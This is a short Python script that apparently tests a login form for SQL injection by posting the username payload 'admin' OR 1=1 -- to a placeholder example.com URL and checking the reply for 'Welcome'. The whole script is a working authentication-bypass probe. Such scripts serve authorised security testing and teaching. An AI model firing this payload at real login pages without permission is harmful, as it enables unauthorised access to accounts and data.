import requests

url = "http://example.com//login"  
payload = {"username": "admin' OR 1=1 --", "password": "password"}
response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("Possible SQL Injection Vulnerability!")
else:
    print("No vulnerability detected.")
